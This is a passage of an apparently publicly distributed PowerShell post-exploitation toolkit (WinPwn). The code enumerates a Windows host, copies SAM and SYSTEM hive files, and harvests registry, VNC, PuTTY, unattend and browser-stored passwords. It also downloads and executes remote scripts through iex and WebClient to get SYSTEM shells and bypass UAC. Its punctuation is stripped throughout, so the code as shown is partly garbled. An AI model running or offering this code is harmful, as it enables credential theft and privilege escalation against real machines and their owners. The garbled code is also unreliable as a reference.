      Write-Host -ForegroundColor Yellow '------- Getting environment variables'
        Get-ChildItem Env  ft Key,Value 
      Write-Host -ForegroundColor Yellow '------- Getting connected drives'
        Get-PSDrive  where {$_.Provider -like Microsoft.PowerShell.CoreFileSystem} ft Name,Root 
        Write-Host -ForegroundColor Yellow '------- Getting current user Privileges'
      whoami priv 
        Write-Host -ForegroundColor Yellow '------- Getting local user account information'
        Get-LocalUser  ft Name,Enabled,LastLogon
        Write-Host -ForegroundColor Yellow '------- Getting local AccountsUsers + Password policy'
      net accounts
        Get-LocalGroup  ft Name
      Write-Host -ForegroundColor Yellow '------- Getting network interfaces, route information, Arp table'
        Get-NetIPConfiguration  ft InterfaceAlias,InterfaceDescription,IPv4Address
        Get-DnsClientServerAddress -AddressFamily IPv4  ft 
        Get-NetRoute -AddressFamily IPv4  ft DestinationPrefix,NextHop,RouteMetric,ifIndex 
        Get-NetNeighbor -AddressFamily IPv4  ft ifIndex,IPAddress,LinkLayerAddress,State 
        netstat -ano 
        Get-ChildItem 'HKLMSOFTWAREMicrosoftNET Framework SetupNDP' -Recurse  Get-ItemProperty -Name Version, Release -ErrorAction 0  where { $_.PSChildName -match '^(!S)p{L}'}  select PSChildName, Version, Release 
        Write-Host -ForegroundColor Yellow '------- Getting Shares'
      net share
      Write-Host -ForegroundColor Yellow '------- Getting hosts file content'
      get-content $envwindirSystem32driversetchosts  out-string 
      Get-ChildItem -Path HKLMSoftwareShellopencommand 
    }
    #Stolen and integrated from 411Hall's JAWS
  Write-Host -ForegroundColor Yellow 'Searching for files with Full Control and Modify Access'
  Function Get-FireWallRule
          {
        Param ($Name, $Direction, $Enabled, $Protocol, $profile, $action, $grouping)
        $Rules=(New-object -comObject HNetCfg.FwPolicy2).rules
        If ($name)      {$rules= $rules  where-object {$_.name     -like $name}}
        If ($direction) {$rules= $rules  where-object {$_.direction  -eq $direction}}
        If ($Enabled)   {$rules= $rules  where-object {$_.Enabled    -eq $Enabled}}
        If ($protocol)  {$rules= $rules  where-object {$_.protocol   -eq $protocol}}
        If ($profile)   {$rules= $rules  where-object {$_.Profiles -bAND $profile}}
        If ($Action)    {$rules= $rules  where-object {$_.Action     -eq $Action}}
        If ($Grouping)  {$rules= $rules  where-object {$_.Grouping -like $Grouping}}
        $rules
      }
	    
      if(!$consoleoutput){Get-firewallRule -enabled $true  sort direction,name  format-table -property Name,localPorts,direction  out-string -Width 4096  $currentPathLocalReconFirewall_Rules.txt}else{Get-firewallRule -enabled $true  sort direction,name  format-table -property Name,localPorts,direction  out-string -Width 4096} 
	    
      $output =  Files with Full Control and Modify Access`r`n
      $output = $output +  -----------------------------------------------------------`r`n
          $files = get-childitem C
          foreach ($file in $files)
          {
              try {
                  $output = $output +  (get-childitem C$file -include .ps1,.bat,.com,.vbs,.txt,.html,.conf,.rdp,.inf,.ini -recurse -EA SilentlyContinue  get-acl -EA SilentlyContinue  select path -expand access  
                  where {$_.identityreference -notmatch BUILTINNT AUTHORITYEVERYONECREATOR OWNERNT SERVICE}  where {$_.filesystemrights -match FullControlModify}  
                  ft @{Label=;Expression={Convert-Path $_.Path}}  -hidetableheaders -autosize  out-string -Width 4096)
                  }
                  catch{$output = $output +   `nFailed to read more files`r`n}
            }
      Write-Host -ForegroundColor Yellow 'Searching for folders with Full Control and Modify Access'
      $output = $output +  -----------------------------------------------------------`r`n
          $output = $output +   Folders with Full Control and Modify Access`r`n
          $output = $output +  -----------------------------------------------------------`r`n
          $folders = get-childitem C
          foreach ($folder in $folders)
          {
              try 
            {
                $output = $output +  (Get-ChildItem -Recurse C$folder -EA SilentlyContinue  { $_.PSIsContainer}  get-acl   select path -expand access   
                where {$_.identityreference -notmatch BUILTINNT AUTHORITYCREATOR OWNERNT SERVICE}   where {$_.filesystemrights -match FullControlModify}  
                select path,filesystemrights,IdentityReference   ft @{Label=;Expression={Convert-Path $_.Path}}  -hidetableheaders -autosize  out-string -Width 4096)
              }
            catch 
          {
              $output = $output +  `nFailed to read more folders`r`n
            }
            }
      if(!$consoleoutput){$output  $currentPathLocalReconFiles_and_Folders_with_Full_Modify_Access.txt}else{Write-Host -------JAWS Recon;$output}
	    
   Write-Host -ForegroundColor Yellow '------- Checking for potential sensitive user files'
   if(!$consoleoutput){get-childitem CUsers -recurse -Include .zip,.rar,.7z,.gz,.conf,.rdp,.kdbx,.crt,.pem,.ppk,.txt,.xml,.vnc..ini,.vbs,.bat,.ps1,.cmd -EA SilentlyContinue  %{$_.FullName }  out-string  $currentPathLocalReconPotential_Sensitive_User_Files.txt}else{get-childitem CUsers -recurse -Include .zip,.rar,.7z,.gz,.conf,.rdp,.kdbx,.crt,.pem,.ppk,.txt,.xml,.vnc..ini,.vbs,.bat,.ps1,.cmd -EA SilentlyContinue  %{$_.FullName }  out-string} 
	 
   Write-Host -ForegroundColor Yellow '------- Checking AlwaysInstallElevated'
   $HKLM = HKLMSOFTWAREPoliciesMicrosoftWindowsInstaller
     $HKCU =  HKCUSOFTWAREPoliciesMicrosoftWindowsInstaller
     if (($HKLM  test-path) -eq True) 
     {
         if (((Get-ItemProperty -Path $HKLM -Name AlwaysInstallElevated).AlwaysInstallElevated) -eq 1)
         {
            if(!$consoleoutput){echo AlwaysInstallElevated enabled on this host!  $currentPathVulnerabilitiesAlwaysInstallElevatedactive.txt}else{Write-Host -ForegroundColor Red AlwaysInstallElevated enabled on this host!}
         }
     }
     if (($HKCU  test-path) -eq True) 
     {
         if (((Get-ItemProperty -Path $HKLM -Name AlwaysInstallElevated).AlwaysInstallElevated) -eq 1)
         {
            if(!$consoleoutput){echo AlwaysInstallElevated enabled on this host!  $currentPathVulnerabilitiesAlwaysInstallElevatedactive.txt}else{Write-Host -ForegroundColor Red AlwaysInstallElevated enabled on this host!}
         }
     }
   Write-Host -ForegroundColor Yellow '------- Checking if Netbios is active'
   $EnabledNics= @(gwmi -query select  from win32_networkadapterconfiguration where IPEnabled='true')

   $OutputObj = @()
         foreach ($Network in $EnabledNics) 
       {
        If($network.tcpipnetbiosoptions) 
        {	
          $netbiosEnabled = [bool]$network
         if ($netbiosEnabled){Write-Host 'Netbios is active, vulnerability found.'; echo Netbios Active, check localrecon folder for network interface Info  $currentPathVulnerabilitiesNetbiosActive.txt}
        }
        $nic = gwmi win32_networkadapter  where {$_.index -match $network.index}
        $OutputObj  += @{
      Nic = $nic.netconnectionid
      NetBiosEnabled = $netbiosEnabled
    }
   }
   $out = $OutputObj  % { new-object PSObject -Property $_}  select Nic, NetBiosEnabled ft -auto
   if(!$consoleoutput){$out  $currentPathLocalReconNetbiosInterfaceInfo.txt}else{$out}
	    
   Write-Host -ForegroundColor Yellow '------- Checking if IPv6 is active (mitm6 attacks)'
   $IPV6 = $false
   $arrInterfaces = (Get-WmiObject -class Win32_NetworkAdapterConfiguration -filter ipenabled = TRUE).IPAddress
   foreach ($i in $arrInterfaces) {$IPV6 = $IPV6 -or $i.contains()}
   if(!$consoleoutput){if ($IPV6){Write-Host 'IPv6 enabled, thats another vulnerability (mitm6)'; echo IPv6 enabled, check all interfaces for the specific NIC  $currentPathVulnerabilitiesIPv6_Enabled.txt }}else{if ($IPV6){Write-Host 'IPv6 enabled, thats another vulnerability (mitm6)'; echo IPv6 enabled, check all interfaces for the specific NIC}}
	 
   Write-Host -ForegroundColor Yellow '------- Collecting installed Software informations'
   if(!$consoleoutput){Get-Installedsoftware -Property DisplayVersion,InstallDate  out-string -Width 4096  $currentPathLocalReconInstalledSoftwareAll.txt}else{Get-Installedsoftware -Property DisplayVersion,InstallDate  out-string -Width 4096}
         
   iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + 'CredsmasterPowershellScriptsInvoke-Vulmap.ps1')
   Write-Host -ForegroundColor Yellow '------- Checking if Software is outdated and therefore vulnerable  exploitable'
   if(!$consoleoutput){Invoke-Vulmap  out-string -Width 4096  $currentPathVulnerabilitiesVulnerableSoftware.txt}else{Invoke-Vulmap  out-string -Width 4096}
        
            
     # Collecting more information
     Write-Host -ForegroundColor Yellow '------- Checking for accesible SAMSYS Files'
     if(!$consoleoutput){
        If (Test-Path -Path 'RegistryHKEY_LOCAL_MACHINESYSTEMCurrentControlSetServicesSNMP'){Get-ChildItem -path 'RegistryHKEY_LOCAL_MACHINESYSTEMCurrentControlSetServicesSNMP' -Recurse  $currentPathLocalReconSNMP.txt}            
        If (Test-Path -Path %SYSTEMROOT%repairSAM){Write-Host -ForegroundColor Yellow SAM File reachable, looking for SYS;copy %SYSTEMROOT%repairSAM $currentPathVulnerabilitiesSAM}
        If (Test-Path -Path %SYSTEMROOT%System32configSAM){Write-Host -ForegroundColor Yellow SAM File reachable, looking for SYS;copy %SYSTEMROOT%System32configSAM $currentPathVulnerabilitiesSAM}
        If (Test-Path -Path %SYSTEMROOT%System32configRegBackSAM){Write-Host -ForegroundColor Yellow SAM File reachable, looking for SYS;copy %SYSTEMROOT%System32configRegBackSAM $currentPathVulnerabilitiesSAM}
        If (Test-Path -Path %SYSTEMROOT%System32configSAM){Write-Host -ForegroundColor Yellow SAM File reachable, looking for SYS;copy %SYSTEMROOT%System32configSAM $currentPathVulnerabilitiesSAM}
        If (Test-Path -Path %SYSTEMROOT%repairsystem){Write-Host -ForegroundColor Yellow SYS File reachable, looking for SAM;copy %SYSTEMROOT%repairsystem $currentPathVulnerabilitiesSYS}
        If (Test-Path -Path %SYSTEMROOT%System32configSYSTEM){Write-Host -ForegroundColor Yellow SYS File reachable, looking for SAM;copy %SYSTEMROOT%System32configSYSTEM $currentPathVulnerabilitiesSYS}
        If (Test-Path -Path %SYSTEMROOT%System32configRegBacksystem){Write-Host -ForegroundColor Yellow SYS File reachable, looking for SAM;copy %SYSTEMROOT%System32configRegBacksystem $currentPathVulnerabilitiesSYS}
     }
     else
     {
        If (Test-Path -Path 'RegistryHKEY_LOCAL_MACHINESYSTEMCurrentControlSetServicesSNMP'){Get-ChildItem -path 'RegistryHKEY_LOCAL_MACHINESYSTEMCurrentControlSetServicesSNMP' -Recurse  $currentPathLocalReconSNMP.txt}            
        If (Test-Path -Path %SYSTEMROOT%repairSAM){Write-Host -ForegroundColor Yellow SAM File reachable at %SYSTEMROOT%repairSAM}
        If (Test-Path -Path %SYSTEMROOT%System32configSAM){Write-Host -ForegroundColor Yellow SAM File reachable at %SYSTEMROOT%System32configSAM, looking for SYS}
        If (Test-Path -Path %SYSTEMROOT%System32configRegBackSAM){Write-Host -ForegroundColor Yellow SAM File reachable at %SYSTEMROOT%System32configRegBackSAM, looking for SYS}
        If (Test-Path -Path %SYSTEMROOT%System32configSAM){Write-Host -ForegroundColor Yellow SAM File reachable at %SYSTEMROOT%System32configSAM, looking for SYS}
        If (Test-Path -Path %SYSTEMROOT%repairsystem){Write-Host -ForegroundColor Yellow SYS File reachable at %SYSTEMROOT%repairsystem, looking for SAM}
        If (Test-Path -Path %SYSTEMROOT%System32configSYSTEM){Write-Host -ForegroundColor Yellow SYS File reachable at %SYSTEMROOT%System32configSYSTEM, looking for SAM}
        If (Test-Path -Path %SYSTEMROOT%System32configRegBacksystem){Write-Host -ForegroundColor Yellow SYS File reachable at %SYSTEMROOT%System32configRegBacksystem, looking for SAM} 
     }
     Write-Host -ForegroundColor Yellow '------- Checking Registry for potential passwords'
     if(!$consoleoutput){
     REG QUERY HKLM F passwor t REG_SZ S K  $currentPathLocalReconPotentialHKLMRegistryPasswords.txt
     REG QUERY HKCU F password t REG_SZ S K  $currentPathLocalReconPotentialHKCURegistryPasswords.txt
     }
     else
     {
        REG QUERY HKLM F passwor t REG_SZ S K
        REG QUERY HKCU F password t REG_SZ S K
     }
     Write-Host -ForegroundColor Yellow '------- Checking sensitive registry entries..'
     If (Test-Path -Path 'RegistryHKEY_LOCAL_MACHINESOFTWAREMicrosoftWindows NTCurrentVersionWinlogon')
   {
    if(!$consoleoutput){reg query HKLMSOFTWAREMicrosoftWindows NTCurrentversionWinlogon  $currentPathLocalReconWinlogon.txt}else{reg query HKLMSOFTWAREMicrosoftWindows NTCurrentversionWinlogon}
   }
     
     if(!$consoleoutput){
     If (Test-Path -Path 'RegistryHKEY_LOCAL_MACHINESYSTEMCurrentControlSetServicesSNMP'){reg query HKLMSYSTEMCurrentControlSetServicesSNMP  $currentPathLocalReconSNMPParameters.txt}
     If (Test-Path -Path 'RegistryHKEY_LOCAL_MACHINESOFTWARESoftwareSimonTathamPuTTYSessions'){reg query HKCUSoftwareSimonTathamPuTTYSessions  $currentPathVulnerabilitiesPuttySessions.txt}
     If (Test-Path -Path 'RegistryHKEY_CURRENT_USERSoftwareORLWinVNC3Password'){reg query HKCUSoftwareORLWinVNC3Password  $currentPathVulnerabilitiesVNCPassword.txt}
     If (Test-Path -Path 'RegistryHKEY_LOCAL_MACHINESOFTWARERealVNCWinVNC4'){reg query HKEY_LOCAL_MACHINESOFTWARERealVNCWinVNC4 v password  $currentPathVulnerabilitiesRealVNCPassword.txt}

     If (Test-Path -Path Cunattend.xml){copy Cunattend.xml $currentPathVulnerabilitiesunattended.xml; Write-Host -ForegroundColor Yellow 'Unattended.xml Found, check it for passwords'}
     If (Test-Path -Path CWindowsPantherUnattend.xml){copy CWindowsPantherUnattend.xml $currentPathVulnerabilitiesunattended.xml; Write-Host -ForegroundColor Yellow 'Unattended.xml Found, check it for passwords'}
     If (Test-Path -Path CWindowsPantherUnattendUnattend.xml){copy CWindowsPantherUnattendUnattend.xml $currentPathVulnerabilitiesunattended.xml; Write-Host -ForegroundColor Yellow 'Unattended.xml Found, check it for passwords'}
     If (Test-Path -Path CWindowssystem32sysprep.inf){copy CWindowssystem32sysprep.inf $currentPathVulnerabilitiessysprep.inf; Write-Host -ForegroundColor Yellow 'Sysprep.inf Found, check it for passwords'}
     If (Test-Path -Path CWindowssystem32sysprepsysprep.xml){copy CWindowssystem32sysprepsysprep.xml $currentPathVulnerabilitiessysprep.inf; Write-Host -ForegroundColor Yellow 'Sysprep.inf Found, check it for passwords'}
     }
     else
     {
        If (Test-Path -Path 'RegistryHKEY_LOCAL_MACHINESYSTEMCurrentControlSetServicesSNMP'){reg query HKLMSYSTEMCurrentControlSetServicesSNMP}
        If (Test-Path -Path 'RegistryHKEY_LOCAL_MACHINESOFTWARESoftwareSimonTathamPuTTYSessions'){reg query HKCUSoftwareSimonTathamPuTTYSessions}
        If (Test-Path -Path 'RegistryHKEY_CURRENT_USERSoftwareORLWinVNC3Password'){reg query HKCUSoftwareORLWinVNC3Password}
        If (Test-Path -Path 'RegistryHKEY_LOCAL_MACHINESOFTWARERealVNCWinVNC4'){reg query HKEY_LOCAL_MACHINESOFTWARERealVNCWinVNC4 v password}

        If (Test-Path -Path Cunattend.xml){Write-Host -ForegroundColor Yellow 'Unattended.xml Found at Cunattend.xml, check it for passwords'}
        If (Test-Path -Path CWindowsPantherUnattend.xml){Write-Host -ForegroundColor Yellow 'Unattended.xml Found at CWindowsPantherUnattend.xml, check it for passwords'}
        If (Test-Path -Path CWindowsPantherUnattendUnattend.xml){Write-Host -ForegroundColor Yellow 'Unattended.xml Found at CWindowsPantherUnattendUnattend.xml, check it for passwords'}
        If (Test-Path -Path CWindowssystem32sysprep.inf){Write-Host -ForegroundColor Yellow 'Sysprep.inf Found at CWindowssystem32sysprep.inf, check it for passwords'}
        If (Test-Path -Path CWindowssystem32sysprepsysprep.xml){Write-Host -ForegroundColor Yellow 'Sysprep.inf Found at CWindowssystem32sysprepsysprep.xml, check it for passwords'}
     }
     
     if(!$consoleoutput){Get-Childitem -Path Cinetpub -Include web.config -File -Recurse -ErrorAction SilentlyContinue  $currentPathVulnerabilitieswebconfigfiles.txt}else{Get-Childitem -Path Cinetpub -Include web.config -File -Recurse -ErrorAction SilentlyContinue}
	    
   Write-Host -ForegroundColor Yellow '------- List running tasks'
     if(!$consoleoutput){Get-WmiObject -Query Select  from Win32_Process  where {$_.Name -notlike svchost}  Select Name, Handle, @{Label=Owner;Expression={$_.GetOwner().User}}  ft -AutoSize  $currentPathLocalReconRunningTasks.txt}else{Get-WmiObject -Query Select  from Win32_Process  where {$_.Name -notlike svchost}  Select Name, Handle, @{Label=Owner;Expression={$_.GetOwner().User}}  ft -AutoSize}

     Write-Host -ForegroundColor Yellow '------- Checking for usable credentials (cmdkey list)'
     if(!$consoleoutput){cmdkey list  $currentPathVulnerabilitiesSavedCredentials.txt}else{cmdkey list} # runas savecred userWORKGROUPAdministrator 10.XXX.XXX.XXXSHAREevil.exe
}


# Looking for Event logs via  djhohnsteins c# eventlog parser ported to powershell
function Powershellsensitive
{
    Param (
    [Switch]
    $consoleoutput,
    [Switch]
    $noninteractive   
  )
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path . -Verbose).FullName
  Write-Host -ForegroundColor Yellow '------- Parsing Event logs for sensitive Information'
    iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + 'CredsmasterPowershellScriptsInvoke-EventLogparser.ps1')
  if(!$consoleoutput){
    [EventLogParser.EventLogHelpers]Parse4104Events($currentPathLocalReconEventLog4013SensitiveInformations.txt,5)
    [EventLogParser.EventLogHelpers]Parse4103Events()
    Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShellOperational'; ID=4104}  Select-Object -Property Message  Select-String -Pattern 'SecureString'  $currentPathLocalReconPowershell_Logs.txt 
    if (isadmin){[EventLogParser.EventLogHelpers]Parse4688Events()}
    }
    else
    {
        [EventLogParser.EventLogHelpers]Parse4104Events( ,5)
      [EventLogParser.EventLogHelpers]Parse4103Events()
      Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShellOperational'; ID=4104}  Select-Object -Property Message  Select-String -Pattern 'SecureString' 
        if (isadmin){[EventLogParser.EventLogHelpers]Parse4688Events()}
    }
}

function Dotnet{
   Param (
    [Switch]
    $consoleoutput,
    [Switch]
    $noninteractive   
  )
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path . -Verbose).FullName
    Write-Host -ForegroundColor Yellow '------- Searching for .NET Services on this system'
    #Lee Christensen's .NET Binary searcher
    iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + 'CredsmasterPowershellScriptsGet-DotNetServices.ps1')
    if(!$consoleoutput){Get-DotNetServices   $currentPathLocalReconDotNetBinaries.txt}else{Get-DotNetServices}
}

function Morerecon{
    Param (
    [Switch]
    $consoleoutput,
    [Switch]
    $noninteractive   
  )
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path . -Verbose).FullName
    if (isadmin)
    {
        
        # P0wersploits local recon function
        IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + 'CredsmasterPowershellScriptsGet-ComputerDetails.ps1')
    
        Write-Host -ForegroundColor Yellow '------- Dumping general computer information '
        if(!$consoleoutput){Get-ComputerDetails  $currentPathLocalReconComputerdetails.txt}else{Get-ComputerDetails}

    }
}

function Sensitivefiles{
    Param (
    [Switch]
    $consoleoutput,
    [Switch]
    $noninteractive   
  )    
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path . -Verbose).FullName
    # obfuscated + string replaced p0werview
    IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + 'Credsmasterobfuscatedpsfind-interesting.ps1')
    if(!$consoleoutput){
        Write-Host -ForegroundColor Yellow 'Looking for interesting files'
        try{Find-InterestingFile -Path 'C'  $currentPathLocalReconInterestingFiles.txt}catch{Write-Host -(}
        try{Find-InterestingFile -Path 'C' -Terms pass,login,rdp,kdbx,backup  $currentPathLocalReconMoreFiles.txt}catch{Write-Host -(}
        Write-Verbose Enumerating more interesting files...

        $SearchStrings = secret,net use,.kdb,creds,credential,.vmdk,confidential,proprietary,pass,credentials,web.config,KeePass.config,.kdbx,.key,tnsnames.ora,ntds.dit,.dll.config,.exe.config
        $IndexedFiles = Foreach ($String in $SearchStrings) {Get-IndexedFiles $string}

        $IndexedFiles Format-List Out-String -width 500  $currentPathLocalReconSensitivelocalfiles.txt
        GCI $ENVUSERPROFILE -recurse -include pass,diagram,.pdf,.vsd,.doc,docx,.xls,.xlsx,.kdbx,.kdb,.rdp,.key,KeePass.config  Select-Object Fullname,LastWriteTimeUTC,LastAccessTimeUTC,Length  Format-Table -auto  Out-String -width 500  $currentPathLocalReconMoreSensitivelocalfiles.txt
    }
    else
    {
        Write-Host -ForegroundColor Yellow 'Looking for interesting files'
        try{Find-InterestingFile -Path 'C'}catch{Write-Host -(}
        try{Find-InterestingFile -Path 'C' -Terms pass,login,rdp,kdbx,backup }catch{Write-Host -(}
        Write-Verbose Enumerating more interesting files...

        $SearchStrings = secret,net use,.kdb,creds,credential,.vmdk,confidential,proprietary,pass,credentials,web.config,KeePass.config,.kdbx,.key,tnsnames.ora,ntds.dit,.dll.config,.exe.config
        $IndexedFiles = Foreach ($String in $SearchStrings) {Get-IndexedFiles $string}

        $IndexedFiles Format-List Out-String -width 500 
        GCI $ENVUSERPROFILE -recurse -include pass,diagram,.pdf,.vsd,.doc,docx,.xls,.xlsx,.kdbx,.kdb,.rdp,.key,KeePass.config  Select-Object Fullname,LastWriteTimeUTC,LastAccessTimeUTC,Length  Format-Table -auto  Out-String -width 500 
    }
}

function Browserpwn{
    Param (
    [Switch]
    $consoleoutput,
    [Switch]
    $noninteractive   
  )
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path . -Verbose).FullName
    $chrome = yes
    if (!$noninteractive){$chrome = Read-Host -Prompt 'Dump Chrome Browser history and maybe passwords (yesno)'}
    if ($chrome -eq yes -or $chrome -eq y -or $chrome -eq Yes -or $chrome -eq Y)
    {
        # Lee Christensen's Chrome-Dump Script
        iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + 'CredsmasterPowershellScriptsGet-ChromeDump.ps1')
        try
        {
            Install-SqlLiteAssembly
            if(!$consoleoutput){
                Get-ChromeDump  $currentPathExploitationChrome_Credentials.txt
                Get-ChromeHistory  $currentPathLocalReconChromeHistory.txt
            }
            else{
                Get-ChromeDump
                Get-ChromeHistory
            }
            Write-Host -ForegroundColor Yellow 'Done, look in the localrecon folder for credshistory'
        }
        catch{}
    }
    $IE = yes
    if (!$noninteractive){$IE = Read-Host -Prompt 'Dump IE  Edge Browser passwords (yesno)'}
    if ($IE -eq yes -or $IE -eq y -or $IE -eq Yes -or $IE -eq Y)
    {
        [void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
        $vault = New-Object Windows.Security.Credentials.PasswordVault 
        if(!$consoleoutput){$vault.RetrieveAll()  % { $_.RetrievePassword();$_ }  $currentPathExploitationInternetExplorer_Credentials.txt}else{$vault.RetrieveAll()  % { $_.RetrievePassword();$_ }}
    }
    $browserinfos = yes
    if (!$noninteractive){$browserinfos = Read-Host -Prompt 'Dump all installed Browser history and bookmarks (yesno)'}
    if ($browserinfos -eq yes -or $browserinfos -eq y -or $browserinfos -eq Yes -or $browserinfos -eq Y)
    {
        # Stolen from Steve Borosh @rvrsh3ll
        IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + 'CredsmasterPowershellScriptsGet-BrowserInformation.ps1')
        if(!$consoleoutput){Get-BrowserInformation  out-string -Width 4096  $currentPathLocalReconAllBrowserHistory.txt}else{Get-BrowserInformation  out-string -Width 4096}
    }
}

function Get-IndexedFiles 
{
     param (
     [Parameter(Mandatory=$true)][string]$Pattern)  
     
     $drives = (Get-PSDrive -PSProvider FileSystem).Root
     foreach ($drive in $drives)
     {
     Write-Host -ForegroundColor Yellow Searching for files in drive $drive 
     $Path = $drive 
        
     $pattern = $pattern -replace , %  
     $path = $path + %
    
     $con = New-Object -ComObject ADODB.Connection
     $rs = New-Object -ComObject ADODB.Recordset
    
     Try {
     $con.Open(Provider=Search.CollatorDSO;Extended Properties='Application=Windows';)}
     Catch {
      [-] Indexed file search provider not available;Break
     }
     $rs.Open(SELECT System.ItemPathDisplay FROM SYSTEMINDEX WHERE System.FileName LIKE ' + $pattern + '  , $con)
    
     While(-Not $rs.EOF){
      $rs.Fields.Item(System.ItemPathDisplay).Value
      $rs.MoveNext()
     }
     }
}

function Dotnetsearch
{
    Param (
    [Switch]
    $consoleoutput,
    [Switch]
    $noninteractive   
  )
    # Copied from httpsgist.github.comTheWover49c5cfd0bbcd4b6c54eb1bb29812ce6e
    Param([parameter(Mandatory=$true,
       HelpMessage=Directory to search for .NET Assemblies in.)]
       $Directory,
       [parameter(Mandatory=$false,
       HelpMessage=Whether or not to search recursively.)]
       [switch]$Recurse = $true,
       [parameter(Mandatory=$false,
       HelpMessage=Whether or not to include DLLs in the search.)]
       [switch]$DLLs = $true,
       [parameter(Mandatory=$false,
       HelpMessage=Whether or not to include all files in the search.)]
       [switch]$All = $true,
       [Switch]$consoleoutput,
       [Switch]$noninteractive 
       )
    
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path . -Verbose).FullName
    if($noninteractive -and $consoleoutput)
    {
        Write-Host ------- Searching for installed .NET Binaries under Program Files 
        Get-ChildItem -Path 'CProgram Files' -Recurse -ErrorAction SilentlyContinue -Force   % { try {$asn = [System.Reflection.AssemblyName]GetAssemblyName($_.fullname); $_.fullname } catch {} }
        Write-Host ------- Searching for installed .NET Binaries under Program Files (x86)
        Get-ChildItem -Path 'CProgram Files (x86)' -Recurse -ErrorAction SilentlyContinue -Force   % { try {$asn = [System.Reflection.AssemblyName]GetAssemblyName($_.fullname); $_.fullname } catch {} }
    }
    if($All)
    {
        Get-ChildItem -Path $Directory -Recurse$Recurse -ErrorAction SilentlyContinue -Force   % { try {$asn = [System.Reflection.AssemblyName]GetAssemblyName($_.fullname); $_.fullname  $currentPathDotNetBinaries.txt} catch {} }
        type $currentPathDotNetBinaries.txt
        Sleep(4)
    }
    else
    {
        Get-ChildItem -Path $Directory -Filter .exe -Recurse$Recurse -ErrorAction SilentlyContinue -Force   % { try {$asn = [System.Reflection.AssemblyName]GetAssemblyName($_.fullname); $_.fullname  $currentPathDotNetBinaries.txt} catch {} }
        
        if ($DLLs)
        {
            Get-ChildItem -Path $Directory -Filter .dll -Recurse$Recurse -ErrorAction SilentlyContinue -Force   % { try {$asn = [System.Reflection.AssemblyName]GetAssemblyName($_.fullname); $_.fullname  $currentPathDotNetBinaries.txt} catch {} }
        }
        type $currentPathDotNetBinaries.txt
        Sleep(4)
    }

}

function SYSTEMShell
{
    pathcheck
    $currentPath = (Get-Item -Path . -Verbose).FullName
    @'

             
__        ___       ____                 
        (_)_ __   _ __      ___ __  
       '_  _)      '_  
   V  V        __  V  V    
   __  __ __     __ _ _

   -- SYSTEM Shellz @S3cur3Th1sSh1t

'@
    
    do
    {
        Write-Host ================ WinPwn ================
        Write-Host -ForegroundColor Green '1. Pop System Shell using CreateProcess!'
        Write-Host -ForegroundColor Green '2. Bind System Shell using CreateProcess! '
        Write-Host -ForegroundColor Green '3. Pop System Shell using NamedPipe Impersonation! '
        Write-Host -ForegroundColor Green '4. Bind System Shell using UsoClient DLL load!'
    Write-Host -ForegroundColor Green '5. Pop System Shell using Token Manipulation!'
        Write-Host -ForegroundColor Green '6. Go back '
        Write-Host ================ WinPwn ================
        $masterquestion = Read-Host -Prompt 'Please choose wisely, master'
        Switch ($masterquestion) 
        {
             1{iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + 'Get-System-TechniquesmasterCreateProcessGet-CreateProcessSystem.ps1')}
             2{iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + 'Get-System-TechniquesmasterCreateProcessGet-CreateProcessSystemBind.ps1')}
             3{iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + 'Get-System-TechniquesmasterNamedPipeNamedPipeSystem.ps1')}
             4{iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + 'Get-System-TechniquesmasterUsoDLLGet-UsoClientDLLSystem.ps1')}
       5{iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + 'Get-System-TechniquesmasterTokenManipulationGet-WinlogonTokenSystem.ps1');Get-WinLogonTokenSystem}
       }
    }
  While ($masterquestion -ne 6)

}

function UACBypass
{
    [CmdletBinding()]
    Param (
        [Switch]
        $noninteractive,
        [Switch]
        $consoleoutput,
        [string]
        $command,
        [string]
        $technique   
    )

    if((!$consoleoutput) -or ($noninteractive)){pathcheck}
    $currentPath = (Get-Item -Path . -Verbose).FullName
    @'

             
__        ___       ____                 
        (_)_ __   _ __      ___ __  
       '_  _)      '_  
   V  V        __  V  V    
   __  __ __     __ _ _

   -- UAC Bypass

'@
    if($noninteractive)
    {
        if ($technique -eq ccmstp)
        {
            iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + 'Credsmasterobfuscatedpsuaccmstp.ps1')
            uaccmstp -BinFile $command
        }
        elseif($technique -eq magic)
        {
            iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + 'Credsmasterobfuscatedpsuacmagic.ps1')
            uacmagic -BinPath $command
        }
        elseif ($technique -eq DiskCleanup)
        {
            iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + 'Credsmasterobfuscatedpsdiskcleanupuac.ps1')
            DiskCleanupBypass -command $command
        }
        return
    }
    
    do
    {
        Write-Host ================ WinPwn ================
        Write-Host -ForegroundColor Green '1. UAC Magic, specify Binary!'
        Write-Host -ForegroundColor Green '2. UAC Bypass ccmstp technique, specify Binary! '
        Write-Host -ForegroundColor Green '3. DiskCleanup UAC Bypass, specify Binary! '
        Write-Host -ForegroundColor Green '4. DccwBypassUAC technique, only cmd shell pop up!'
        Write-Host -ForegroundColor Green '5. Go back '
        Write-Host ================ WinPwn ================
        $masterquestion = Read-Host -Prompt 'Please choose wisely, master'
        Switch ($masterquestion) 
        {
